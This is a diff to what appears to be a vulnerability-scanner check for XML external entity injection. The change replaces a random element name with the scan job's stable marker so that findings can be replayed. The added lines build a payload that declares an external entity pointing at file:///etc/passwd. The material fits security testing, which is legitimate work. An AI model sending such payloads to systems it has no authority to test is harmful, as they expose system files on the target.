@@ -35,8 +35,12 @@ const META = #{
 
 fn load(reg) {
     reg.add_check(META, |point| {
-        // A per-run element name, so the reply can only match this probe.
-        let tag = rand_text_alpha(5);
+        // The element name is the job's own marker — the collision-resistant
+        // token the job already stamps its traffic with. Random letters would
+        // do as well for uniqueness, but the marker is stable for the run, so
+        // the document quoted in the finding is byte-for-byte the document
+        // that was sent, and an operator can replay it.
+        let tag = probe.marker();
         let reference = "&" + tag + ";";
         let document = `<?xml version="1.0"?>` +
             `<!DOCTYPE ${tag} [<!ENTITY ${tag} SYSTEM "file:///etc/passwd">]>` +
